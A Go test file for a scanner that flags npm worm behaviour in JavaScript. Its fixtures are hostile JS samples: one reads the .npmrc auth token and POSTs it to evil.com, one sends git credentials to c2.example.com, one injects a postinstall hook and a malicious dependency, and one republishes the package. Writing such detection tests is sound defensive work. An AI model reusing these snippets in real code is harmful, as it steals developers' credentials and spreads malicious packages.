package analyzer

import (
	"strings"
	"testing"
)

func TestWormAnalyzer_NpmPublish(t *testing.T) {
	a := NewWormAnalyzer()
	content := `
const { execSync } = require('child_process');
// Modify package.json and republish
const pkg = require('./package.json');
pkg.version = '9.9.9';
fs.writeFileSync('package.json', JSON.stringify(pkg));
execSync('npm publish');
`
	findings := a.scanContent(content, "worm.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "worm") || strings.Contains(f.Title, "Worm") || strings.Contains(f.Title, "self-replicat") || strings.Contains(f.Title, "publish") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect npm publish worm behavior")
	}
}

func TestWormAnalyzer_NpmrcTokenTheft(t *testing.T) {
	a := NewWormAnalyzer()
	content := `
const fs = require('fs');
const path = require('path');
const npmrc = fs.readFileSync(path.join(process.env.HOME, '.npmrc'), 'utf8');
const token = npmrc.match(/:_authToken=(.+)/)[1];
fetch('https://evil.com/tokens', { method: 'POST', body: token });
`
	findings := a.scanContent(content, "steal.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "npmrc") || strings.Contains(f.Title, "token") || strings.Contains(f.Title, "Token") || strings.Contains(f.Title, "credential") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect .npmrc token theft")
	}
}

func TestWormAnalyzer_GitCredentialAccess(t *testing.T) {
	a := NewWormAnalyzer()
	content := `
const { execSync } = require('child_process');
const gitToken = execSync('git config --global credential.helper').toString();
const files = execSync('find ~/.git-credentials -type f').toString();
fetch('https://c2.example.com', { method: 'POST', body: files });
`
	findings := a.scanContent(content, "git_steal.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "git") || strings.Contains(f.Title, "Git") || strings.Contains(f.Title, "credential") || strings.Contains(f.Title, "Credential") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect git credential theft")
	}
}

func TestWormAnalyzer_PackageJsonModification(t *testing.T) {
	a := NewWormAnalyzer()
	content := `
const pkg = JSON.parse(fs.readFileSync('package.json'));
pkg.scripts.postinstall = 'node ./malware.js';
pkg.dependencies['evil-pkg'] = '^1.0.0';
fs.writeFileSync('package.json', JSON.stringify(pkg, null, 2));
execSync('npm install');
`
	findings := a.scanContent(content, "infect.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "package.json") || strings.Contains(f.Title, "modification") || strings.Contains(f.Title, "inject") || strings.Contains(f.Title, "worm") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect package.json modification for worm propagation")
	}
}

func TestWormAnalyzer_CleanCode(t *testing.T) {
	a := NewWormAnalyzer()
	content := `
const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('OK'));
app.listen(3000);
`
	findings := a.scanContent(content, "clean.js")
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity in clean code: %s", f.Title)
		}
	}
}
